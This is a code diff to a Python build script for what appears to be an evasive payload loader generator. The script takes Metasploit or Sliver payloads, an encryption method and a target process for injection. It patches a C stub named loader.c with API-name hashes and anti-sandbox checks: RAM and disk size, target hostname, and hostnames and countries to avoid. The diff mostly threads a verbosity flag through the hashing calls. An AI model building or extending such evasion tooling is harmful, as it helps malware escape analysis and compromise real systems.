@@ -16,7 +16,8 @@ config.read(".conf")
 def is_set(value):
     return value != None and value != ""
 
-VERBOSE = True if sys.argv[1] == "1" else False
+VERBOSE = True if sys.argv[1] == "true" else False
+PRIORIZE_SIZE = True if sys.argv[2] == "true" else False
 
 FRAMEWORK = config.get("Payload", "framework")
 if FRAMEWORK != "metasploit" and FRAMEWORK != "sliver" and FRAMEWORK != "raw":
@@ -25,9 +26,6 @@ if FRAMEWORK != "metasploit" and FRAMEWORK != "sliver" and FRAMEWORK != "raw":
 
 ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
 TARGET_PROCESS = config.get("Payload", "target_process")
-
-STUB_FILE = config.get("Stub", "filename")
-PRIORIZE_SIZE = config.getboolean("Stub", "priorize_size")
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 RAM_SIZE = config.get("Anti-Analysis", "ram_size")
@@ -44,6 +42,7 @@ if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
     AVOID_COUNTRIES = []
 
 WORKING_FOLDER = "build/"
+STUB_FILE = "loader.c"
 
 
 def main():
@@ -95,7 +94,7 @@ def main():
             for tag in remaining_tags:
                 parts = tag.replace("%", "").split("__")
                 if parts[0] == "HASH":
-                    sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(hash(parts[1], parts[2], ROR_VALUE)))
+                    sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(hash(parts[1], parts[2], ROR_VALUE, VERBOSE))) 
                 if parts[0] == "RANDOM":
                     # Générer une valeur aléatoire de 32 bits
                     dword_value = random.randint(0, 0xFFFFFFF)
@@ -128,12 +127,12 @@ def main():
         for tag in tags:
             parts = tag.replace("%", "").split("__")
             if parts[0] == "MODHASH": # definitions.c
-                sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],""))
+                sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],"", VERBOSE))
             if parts[0] == "FCTHASH": # definitions.c
                 if parts[1] == "target_process":
-                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", TARGET_PROCESS))
+                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", TARGET_PROCESS, VERBOSE))
                 else:
-                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1]))
+                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1], VERBOSE))
             if parts[0] == "SANDBOX":
                 if parts[1] == "RAM_CHECK":
                     if is_set(RAM_SIZE):
@@ -165,7 +164,7 @@ def main():
                     sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
                 if parts[1] == "TARGET_HOSTNAME":
                     if len(TARGET_HOSTNAME):
-                        sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME))
+                        sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME, VERBOSE))
                         print("Target hostname: ", TARGET_HOSTNAME) if VERBOSE else None
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
@@ -174,7 +173,7 @@ def main():
                         res = ""
                         for hostname in AVOID_HOSTNAME:
                             if hostname != "":
-                                res += hash_obj("",hostname)+","
+                                res += hash_obj("",hostname, VERBOSE)+","
                         sed_file(WORKING_FOLDER+filename, tag, res[:-1])
                         print("Avoid hostnames: ", AVOID_HOSTNAME) if VERBOSE else None
                     else:
